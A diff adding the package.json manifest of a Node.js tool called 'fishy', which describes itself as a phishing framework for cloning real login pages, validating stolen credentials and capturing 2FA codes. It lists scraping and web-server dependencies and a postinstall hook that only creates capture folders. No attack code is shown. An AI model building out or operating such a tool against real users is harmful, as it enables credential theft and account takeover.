@@ -1,0 +1,25 @@
+{
+  "name": "fishy",
+  "version": "1.0.0",
+  "description": "Phishing framework — real page cloning, credential validation, 2FA capture",
+  "type": "module",
+  "bin": {
+    "fishy": "./bin/fishy.js"
+  },
+  "scripts": {
+    "start": "node bin/fishy.js",
+    "postinstall": "node -e \"require('fs').mkdirSync('captures',{recursive:true});require('fs').mkdirSync('scraped',{recursive:true})\""
+  },
+  "dependencies": {
+    "axios": "^1.7.7",
+    "chalk": "^5.3.0",
+    "cheerio": "^1.0.0",
+    "commander": "^12.1.0",
+    "express": "^4.21.0",
+    "inquirer": "^10.2.0",
+    "open": "^10.1.0",
+    "ora": "^8.1.0",
+    "puppeteer-core": "^23.0.0",
+    "uuid": "^10.0.0"
+  }
+}
